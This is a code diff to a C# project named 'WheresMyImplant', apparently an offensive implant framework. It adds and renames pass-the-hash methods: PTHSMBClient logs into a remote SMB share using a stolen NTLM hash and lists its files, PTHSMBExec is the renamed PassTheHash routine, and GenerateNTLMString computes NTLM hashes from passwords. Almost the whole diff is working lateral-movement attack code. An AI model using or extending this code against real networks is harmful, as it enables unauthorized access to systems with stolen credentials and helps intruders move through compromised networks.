@@ -197,7 +197,51 @@ namespace WheresMyImplant
         */
 
         [ManagementTask]
-        public static String PassTheHash(String target, String share, String domain, String username, String hash)
+        public static String PTHSMBClient(String target, String share, String domain, String username, String hash)
+        {
+            StringBuilder output = new StringBuilder();
+            using (SMBClient smbClient = new SMBClient())
+            {
+                if (!smbClient.Connect(target))
+                {
+                    return "[-] Unable to Connect";
+                }
+
+                smbClient.NegotiateSMB();
+                smbClient.NegotiateSMB2();
+                smbClient.NTLMSSPNegotiate();
+
+                if (!smbClient.Authenticate(domain, username, hash))
+                {
+                    return "[-] Login Failed";
+                }
+
+                try
+                {
+                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
+                    smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, share));
+                    smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, share));
+                    smbClient.CreateRequest();
+                    smbClient.InfoRequest();
+                    smbClient.FindRequest();
+                    smbClient.ParseDirectoryContents();
+                    smbClient.CloseRequest();
+                    smbClient.DisconnectTree();
+                }
+                catch (Exception ex)
+                {
+                    output.Append(ex.ToString());
+                }
+                finally
+                {
+                    output.Append(smbClient.GetOutput());
+                }
+            }
+            return output.ToString();
+        }
+
+        [ManagementTask]
+        public static String PTHSMBExec(String target, String share, String domain, String username, String hash)
         {
             StringBuilder output = new StringBuilder();
             using (SMBClient smbClient = new SMBClient())
@@ -228,6 +272,10 @@ namespace WheresMyImplant
                     {
                         output.Append(smbClient.GetOutput());
                     }
+                }
+                else
+                {
+                    output.Append("[-] Login Failed");
                 }
             }
             return output.ToString();
@@ -304,6 +352,26 @@ namespace WheresMyImplant
                 return Convert.ToBase64String(fileBytes);
             }
             return strBytes;
+        }
+
+        [ManagementTask]
+        public static String GenerateNTLMString(String password)
+        {
+            StringBuilder output = new StringBuilder();
+            try
+            {
+                Byte[] bPassword = Encoding.Unicode.GetBytes(password);
+                Org.BouncyCastle.Crypto.Digests.MD4Digest md4Digest = new Org.BouncyCastle.Crypto.Digests.MD4Digest();
+                md4Digest.BlockUpdate(bPassword, 0, bPassword.Length);
+                Byte[] result = new Byte[md4Digest.GetDigestSize()];
+                md4Digest.DoFinal(result, 0);
+                output.Append(BitConverter.ToString(result).Replace("-", ""));
+            }
+            catch (Exception ex)
+            {
+                output.Append(ex.ToString());
+            }
+            return output.ToString();
         }
     }
 }
